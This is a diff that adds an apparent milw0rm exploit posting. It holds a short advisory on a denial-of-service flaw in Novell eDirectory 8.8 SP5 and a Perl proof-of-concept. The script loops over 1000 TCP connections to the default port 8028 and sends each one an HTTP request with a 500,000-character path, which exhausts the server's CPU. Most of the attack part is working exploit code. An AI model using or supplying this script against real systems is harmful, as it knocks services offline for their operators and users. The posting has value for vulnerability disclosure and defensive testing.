@@ -1,0 +1,41 @@
+Affected Software:
+Novell eDirectory 8.8 SP5
+
+Vulnerability Description:
+Novell eDirectory 8.8 SP5 is vulnerable to a denial of service attack.
+If a remote attacker sends Unicode strings with Http Request to "8028 port" 
+("8028" is the default port of Novell eDirectory Dhost Http Server), 
+the attacker can cause the system to consume %100 of the CPU resources.
+
+Discovered by:
+karak0rsan, Hellcode Research
+
+Original Advisory: 
+http://tcc.hellcode.net/advisories/hellcode-adv003.txt
+
+Exploit:
+
+	- snip-
+....
+
+$data = "?" x 500000;
+
+for($i= 0; $i < 1000; $i++)
+{
+	$sock= new IO::Socket::INET( PeerAddr => "localhost",
+	PeerPort => 8028,
+
+	Proto => 'tcp',
+	Type => SOCK_STREAM, 
+
+	);
+	
+	print $sock "GET /$data HTTP/1.0\r\n\r\n";
+	
+	close($sock);
+}
+
+...
+	- snip -
+
+# milw0rm.com [2009-09-09]
